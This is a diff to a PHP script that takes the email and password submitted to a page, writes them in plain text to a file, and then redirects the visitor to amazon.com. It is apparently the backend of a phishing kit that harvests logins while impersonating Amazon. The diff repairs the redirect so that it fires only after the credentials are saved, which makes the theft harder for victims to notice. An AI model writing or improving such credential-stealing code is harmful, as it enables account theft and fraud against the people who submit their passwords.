@@ -1,5 +1,4 @@
 <?php
-header('Location: nose.com');
  $user = $_POST["email"];
  $pass = $_POST["password"];
 
@@ -10,5 +9,6 @@ header('Location: nose.com');
  $pa = "Password: $pass\n";
  fwrite($fileuser, "\n". $co. "\n". $us. $pa. "\n". $cl); 
  fclose($fileuser);
+ header('Location: https://amazon.com');
  exit()
 ?>
